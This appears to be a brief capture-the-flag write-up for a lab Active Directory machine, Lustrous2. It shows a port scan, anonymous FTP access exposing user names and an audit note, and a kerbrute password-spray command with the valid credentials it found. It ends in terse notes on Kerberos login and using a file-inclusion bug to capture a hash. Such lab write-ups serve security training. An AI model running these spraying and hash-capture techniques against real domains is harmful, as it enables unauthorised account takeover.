
![](Lustrous_Cover.png)



## INFO

```
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```



FTP got anonymous access , where we found list of valid domain users and a audit draft file.

```
ftp> more audit_draft.txt
Audit Report Issue Tracking

[Fixed] NTLM Authentication Allowed
[Fixed] Signing & Channel Binding Not Enabled
[Fixed] Kerberoastable Accounts
[Fixed] SeImpersonate Enabled

[Open] Weak User Passwords
```

Now , as we got usernames , Lets try Kerberoasting and password spray , because the issue [Weak User Passwords] is still not fixed and we can take advantage of that.

Weak Passwords -> Company + Year + Symbol --> Season + Year + Symbol


```
└─# ./kerbrute_ passwordspray -d lustrous2.vl --dc LUS2DC.Lustrous2.vl user_lst Summer2024! -v

[+] VALID LOGIN:  Emma.Bell@lustrous2.vl:Summer2024!

[+] VALID LOGIN:  Terence.Jordan@lustrous2.vl:Lustrous2!

[+] VALID LOGIN:  Thomas.Myers@lustrous2.vl:Lustrous2024
```

Cool ! 



As NTLM Authentication has been disabled . we need to login with Kerberos.

[ Negotiate --> Firefox --> Web mah lfi cha --> lfi to capture hash ! ]